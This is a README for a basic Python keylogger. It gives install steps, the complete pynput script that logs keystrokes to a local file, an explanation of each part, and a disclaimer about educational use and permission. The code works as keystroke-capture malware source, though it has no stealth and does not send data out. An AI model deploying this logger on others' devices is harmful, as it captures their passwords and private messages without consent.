# Keylogger

This project is a simple keylogger implemented in Python using the `pynput` library. It listens for keyboard events and logs the keys pressed to a file.
## Requirements

To run this keylogger script, you need to have the following software and libraries installed on your machine:

### 1. Python
- **Python 3.x**: This script is written in Python and requires Python 3.x to run. You can download the latest version of Python from the [official website](https://www.python.org/downloads/).

To check if Python is installed on your machine and to verify the version, you can run the following command in your terminal or command prompt:


python --version

## Installation
 **Clone the repository or download the script.**
   

   git clone https://github.com/yourusername/keylogger.git
   cd keylogger
## install the pynput library.

You can install the required library using pip:
  ' pip install pynput'
### Run the keylogger script

 python keylogger.py
## Log file.

The script creates/appends to a file named keyfile.text in the same directory, where all key presses are logged.
# code Explanation

from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.text", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

## Importing the library:
from pynput import keyboard


# Defining the key press handler:

- def keyPressed(key):
  -  print(str(key))
   - with open("keyfile.text", 'a') as logkey:
   -     try:
   -         char = key.char
    -        logkey.write(char)
     -   except:
      -      print("error getting char")

The `keyPressed `function is called every time a key is pressed. It attempts to write the character of the key to `keyfile.text`. If the key doesn't have a character representation (e.g., special keys like Ctrl or Alt), it catches the exception and prints an error message.
# Setting up the listener:

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

This block checks if the script is being run directly (not imported as a module). It creates a `keyboard.Listener` object that listens for key presses and starts it. The `input()` function keeps the program running.

# Disclaimer
This keylogger is for educational purposes only. Unauthorized use of a keylogger can be illegal and unethical. Ensure you have explicit permission to use this tool on any device.
